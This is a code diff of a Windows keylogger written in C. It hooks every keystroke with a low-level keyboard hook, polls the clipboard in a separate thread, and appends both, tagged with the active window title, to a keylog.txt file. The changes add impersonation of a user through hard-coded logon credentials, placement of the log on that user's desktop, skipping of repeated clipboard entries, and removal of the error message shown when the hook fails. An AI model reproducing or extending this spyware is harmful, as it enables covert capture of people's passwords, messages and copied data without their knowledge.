@@ -1,10 +1,65 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
+#include <shlobj.h>
+#include <string.h>
 
-#define LOG_FILE "C:\\Users\\jareste\\Desktop\\keylog.txt"
+#pragma warning(push)
+#pragma warning(disable : 4820)
+#include <userenv.h>
+#pragma warning(pop)
 
-void LogKeystroke(char* keystroke)
+#define USER "jareste"
+#define DOMAIN "."
+#define PASSWORD "1234"
+
+#define MAX_PATH_LENGTH 260
+char LOG_FILE[MAX_PATH_LENGTH];
+char lastClipboardContent[1024] = "";
+
+void ImpersonateUser(const char* username, const char* domain, const char* password)
+{
+    HANDLE hToken;
+    if (LogonUserA(username, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
+    {
+        if (ImpersonateLoggedOnUser(hToken))
+        {
+            CloseHandle(hToken);
+            return;
+        }
+        CloseHandle(hToken);
+    }
+}
+
+void SetLogFilePath(void)
+{
+    PWSTR desktopPath = NULL;
+    HRESULT result = SHGetKnownFolderPath(&FOLDERID_Desktop, 0, NULL, &desktopPath);
+
+    if (result == S_OK)
+    {
+        char path[MAX_PATH];
+        size_t convertedChars = 0;
+
+        if (wcstombs_s(&convertedChars, path, MAX_PATH, desktopPath, _TRUNCATE) == 0)
+        {
+            snprintf(LOG_FILE, MAX_PATH, "%s\\keylog.txt", path);
+        }
+        else
+        {
+            snprintf(LOG_FILE, MAX_PATH, "C:\\keylog.txt");
+        }
+        
+        CoTaskMemFree(desktopPath);
+    }
+    else
+    {
+        snprintf(LOG_FILE, MAX_PATH, "C:\\keylog.txt");
+    }
+}
+
+void LogKeystroke(char* keystroke, BOOL clipboard)
 {
     FILE* file = fopen(LOG_FILE, "a");
     if (!file) return;
@@ -18,27 +73,17 @@ void LogKeystroke(char* keystroke)
     char windowTitle[256];
     GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
 
-    fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
+    if (clipboard)
+    {
+        fprintf(file, "[%s] - '%s': [CLIPBOARD] %s\n", time_str, windowTitle, keystroke);
+    }
+    else
+    {
+        fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
+    }
+    // fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
     fclose(file);
 }
-
-// void LogClipboardContent(void)
-// {
-//     if (OpenClipboard(NULL))
-//     {
-//         HANDLE hData = GetClipboardData(CF_TEXT);
-//         if (hData)
-//         {
-//             char* clipboardText = (char*)GlobalLock(hData);
-//             if (clipboardText)
-//             {
-//                 LogKeystroke(clipboardText);
-//                 GlobalUnlock(hData);
-//             }
-//         }
-//         CloseClipboard();
-//     }
-// }
 
 void LogClipboardContent(void)
 {
@@ -50,7 +95,12 @@ void LogClipboardContent(void)
             char* clipboardText = (char*)GlobalLock(hData);
             if (clipboardText)
             {
-                LogKeystroke(clipboardText);
+                if (strncmp(clipboardText, lastClipboardContent, 1023) != 0)
+                {
+                    LogKeystroke(clipboardText, TRUE);
+                    strncpy_s(lastClipboardContent, sizeof(lastClipboardContent), clipboardText, 1023);
+                    lastClipboardContent[1023] = '\0';
+                }
                 GlobalUnlock(hData);
             }
         }
@@ -83,15 +133,15 @@ void LogKeyPress(DWORD vkCode)
     if (len == 1)
     {
         keyName[1] = '\0';
-        LogKeystroke(keyName);
+        LogKeystroke(keyName, FALSE);
     }
     else if (vkCode == VK_RETURN)
     {
-        LogKeystroke("[ENTER]");
+        LogKeystroke("[ENTER]", FALSE);
     }
     else if (vkCode == VK_SPACE)
     {
-        LogKeystroke("[SPACE]");
+        LogKeystroke("[SPACE]", FALSE);
     }
 }
 
@@ -109,14 +159,21 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+
 int main(void)
 {
+    /* in case this would fail, it wouldn't log into the user but 
+        into c:\ directly
+    */
+    ImpersonateUser(USER, DOMAIN, PASSWORD);
+    
+    SetLogFilePath();
+
     HANDLE hClipboardThread = CreateThread(NULL, 0, ClipboardLoggerThread, NULL, 0, NULL);
 
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
     if (!hHook)
     {
-        printf("Failed to install hook!\n");
         return 1;
     }
 
@@ -129,5 +186,6 @@ int main(void)
 
     UnhookWindowsHookEx(hHook);
     CloseHandle(hClipboardThread);
+
     return 0;
 }
